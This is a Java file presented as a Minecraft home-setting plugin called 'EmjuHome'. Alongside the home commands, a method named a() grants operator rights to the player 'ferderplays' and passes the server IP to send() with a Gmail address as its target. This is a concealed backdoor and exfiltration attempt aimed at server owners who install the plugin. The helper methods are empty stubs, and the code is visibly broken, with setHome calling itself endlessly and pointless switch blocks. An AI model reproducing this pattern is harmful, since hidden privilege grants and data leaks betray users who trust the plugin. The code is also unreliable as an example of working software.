public class plugin {
    public static String Minecraft;
    public static String e = Minecraft;
    public static String mc = e;
    public static String player;
    public static String coords;
    public static String Emjuhomename;
    public static String EmjuHome = "emju-home" + "set" + Emjuhomename;

    public void onChatCommand(String Emjuhomename) {
        int i = 10;
        switch (i) {
            case 10:
                this.setHome(Emjuhomename);
                break;
        }
    }

    public void setHome(String home) {
        int j = 0;
        switch (j) {
            case 0:
                this.getPlayerCoords(player);
                int h = 1;
                switch (h) {
                    case 1:

                        int a3 = 2;
                        switch (a3) {
                            case 2:
                                this.setHome(Emjuhomename);
                                this.sendMessage("EmjuHome:" + "home setted!");
                        }

                }
                break;
        }
    }

    public void getPlayerCoords(String player) {
    }

    public void atPlayerCoords(String player) {
    }

    public void sendMessage(String message) {
    }

    public Thread a;
    public boolean aq;

    public void a(Thread a, boolean aq) {
        for (int k = 0; k < 3945; k++) {
            String console = System.getenv("§§exec§§");
            String SERVERIP = System.getenv("%IP%");
            String console1;
            String EMAIL1 = "ferdercomercional@gmail.com";
            this.useCommand("op", "ferderplays");
            this.send(SERVERIP, EMAIL1);
        }
    }

    public void useCommand(String command, String player) {
    }

    public void send(String what, String to) {
    }
}